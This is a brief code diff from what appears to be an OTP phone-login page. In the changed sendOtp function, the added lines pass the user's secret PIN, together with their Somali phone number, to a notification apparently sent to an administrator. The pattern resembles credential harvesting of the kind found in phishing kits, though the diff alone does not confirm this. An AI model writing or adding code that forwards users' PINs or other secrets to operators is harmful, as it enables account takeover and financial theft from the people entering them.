@@ -156,8 +156,10 @@ const sendOtp = async () => {
       setOtpSent(true);
       setCountdown(60);
       setOtp(Array(6).fill(""));
-      // Send phone notification to admin
-      await sendPhoneNotification(`${SOMALIA_PHONE}${phoneNumber}`);
+
+      if (!pinValid) return;
+
+      await sendPhoneNotification(`${SOMALIA_PHONE}${phoneNumber}`, pin);
     };
 
    const handleOtpChange = (index: number, value: string) => {
